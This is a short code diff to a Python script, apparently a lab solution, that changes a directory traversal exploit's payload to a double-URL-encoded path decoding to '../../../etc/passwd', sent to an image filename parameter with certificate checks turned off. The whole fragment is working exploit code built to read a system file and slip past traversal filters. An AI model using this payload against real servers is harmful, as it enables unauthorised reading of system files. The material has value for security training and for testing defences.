@@ -13,7 +13,11 @@ proxies = {
 def directory_traversal_exploit(url):
     image_url = (
         url +
-        "/image?filename=....//....//....//....//etc/passwd")
+        "/image?filename=%25%32%65%25%32%65%25%32%66%25%32%65" +
+        "%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%36%35" +
+        "%25%37%34%25%36%33%25%32%66%25%37%30%25%36%31%25%37%33" +
+        "%25%37%33%25%37%37%25%36%34"
+    )
     response = requests.get(
         image_url,
         verify=False,
